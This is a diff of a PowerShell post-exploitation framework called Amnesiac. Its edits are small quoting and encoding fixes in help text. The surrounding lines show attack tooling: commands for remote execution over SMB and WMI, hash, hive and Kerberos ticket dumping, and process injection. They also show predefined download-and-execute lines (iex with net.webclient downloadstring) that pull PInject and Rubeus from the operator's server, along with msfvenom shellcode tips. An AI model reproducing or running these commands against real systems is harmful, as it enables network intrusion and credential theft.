@@ -1,4 +1,4 @@
-function Amnesiac {
+﻿function Amnesiac {
 
 	<#
 	.SYNOPSIS
@@ -5232,8 +5232,8 @@ function PrintHelpRemoting{
 	Write-Output ""
 	Write-Output "[+] Shortcuts:"
 	Write-Output ""
-	Write-Output "    SMBRemoting <fqdn> <cmd>      Run command on target as current user using SMBRemoting"
-	Write-Output "    WMIRemoting <fqdn> <cmd>      Run command on target as current user using WMIRemoting"
+	Write-Output '    SMBRemoting <fqdn> <cmd>      Run command on target as current user using SMBRemoting'
+	Write-Output '    WMIRemoting <fqdn> <cmd>      Run command on target as current user using WMIRemoting'
 	Write-Output ""
 	Write-Output ""
 	Write-Host "[*] Important:" -Foreground yellow
@@ -5287,7 +5287,7 @@ function Get-AvailableCommands  {
 	Write-Output " Download           Download file from remote system [file name]"
 	Write-Output " Exit               Background the current session"
 	Write-Output " GListener          Print Global-Listener Payload"
-	Write-Output " GLSet <>           Set Global-Listener Pipe Name"
+	Write-Output ' GLSet <>           Set Global-Listener Pipe Name'
 	Write-Output " Help               Help menu"
 	Write-Output " Kill               Terminate the current session"
 	Write-Output " OneIsNone          Get a Backup Shell"
@@ -5343,8 +5343,8 @@ function Get-AvailableCommands  {
 	Write-Output " HashGrab           Attempt to retrieve the Hash of the current user"
 	Write-Output " Hive               HiveDump"
 	Write-Output " Kerb               Kerb TGTs Dump"
-	Write-Output " Migrate <pid>      Inject payload into specified pid [New Session]"
- 	Write-Output " Migrate2 <pid>     Different migration syntax [In case the above fails]"
+	Write-Output ' Migrate <pid>      Inject payload into specified pid [New Session]'
+ 	Write-Output ' Migrate2 <pid>     Different migration syntax [In case the above fails]'
 	Write-Output " Monitor            Monitor Cache for TGTs"
 	Write-Output " MonitorRead        Retrieve TGTs from Monitor activity"
 	Write-Output " MonitorClear       Clear TGTs from Monitor activity"
@@ -5384,7 +5384,7 @@ function Get-Command {
 	
 	elseif($Command -eq "PInject"){
 		$predefinedCommands = @(
-			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1');Write-Output '';Write-Output '[+] PInject Loaded | https://github.com/3xpl01tc0d3r/ProcessInjection';Write-Output '';Write-Output '[+] Usage: PInject <pid> <shellcode_in_hex_format>';Write-Output '';Write-Output '[+] Tip: How to generate your hex shell code:';Write-Output '';Write-Output '    ShellGen powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=';Write-Output '';Write-Output '    msfvenom -p windows/x64/exec CMD=`"powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=`" exitfunc=thread -b `"\x00`" -f hex'"
+			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1');Write-Output '';Write-Output '[+] PInject Loaded | https://github.com/3xpl01tc0d3r/ProcessInjection';Write-Output '';Write-Output '[+] Usage: PInject `<pid`> `<shellcode_in_hex_format`>';Write-Output '';Write-Output '[+] Tip: How to generate your hex shell code:';Write-Output '';Write-Output '    ShellGen powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=';Write-Output '';Write-Output '    msfvenom -p windows/x64/exec CMD=`"powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=`" exitfunc=thread -b `"\x00`" -f hex'"
 		)
 	}
 	
@@ -5480,7 +5480,7 @@ function Get-Command {
 	
 	elseif ($Command -eq "Rubeus") {
 		$predefinedCommands = @(
-			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');Write-Output '';Write-Output '[+] Rubeus Loaded | https://github.com/GhostPack/Rubeus';Write-Output '';Write-Output '[+] Usage: Rubeus <command>';Write-Output '';Write-Output '    Rubeus createnetonly /program:c:\windows\system32\cmd.exe /domain: /dc: /username: /password:fakepass /ptt /ticket:'"
+			"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');Write-Output '';Write-Output '[+] Rubeus Loaded | https://github.com/GhostPack/Rubeus';Write-Output '';Write-Output '[+] Usage: Rubeus `<command`>';Write-Output '';Write-Output '    Rubeus createnetonly /program:c:\windows\system32\cmd.exe /domain: /dc: /username: /password:fakepass /ptt /ticket:'"
 		)
 	}
 	
